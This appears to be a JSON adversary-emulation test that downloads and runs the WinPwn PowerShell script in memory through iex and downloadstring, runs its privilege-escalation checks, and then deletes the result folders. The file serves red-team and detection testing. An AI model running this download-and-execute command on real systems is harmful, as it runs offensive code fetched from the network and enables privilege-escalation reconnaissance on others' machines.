{
  "id": "345cb8e4-d2de-4011-a580-619cf5a9e2d7",
  "name": "WinPwn - Powersploits privesc checks",
  "description": "Powersploits privesc checks using oldchecks function of WinPwn",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "feb0f358-6115-445a-b941-5e3cb4867168",
      "type": "execute-command",
      "data": {
        "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\noldchecks -noninteractive -consoleoutput",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "b82acbf5-3925-4658-89be-46cdd02b0012",
      "type": "execute-command",
      "data": {
        "command": "rm -force -recurse .\\DomainRecon -ErrorAction Ignore\nrm -force -recurse .\\Exploitation -ErrorAction Ignore\nrm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore\nrm -force -recurse .\\LocalRecon -ErrorAction Ignore\nrm -force -recurse .\\Vulnerabilities -ErrorAction Ignore",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "feb0f358-6115-445a-b941-5e3cb4867168",
      "p": "on-success",
      "o": "b82acbf5-3925-4658-89be-46cdd02b0012"
    },
    {
      "s": "feb0f358-6115-445a-b941-5e3cb4867168",
      "p": "on-failure",
      "o": "b82acbf5-3925-4658-89be-46cdd02b0012"
    }
  ],
  "tags": [
    "T1082"
  ]
}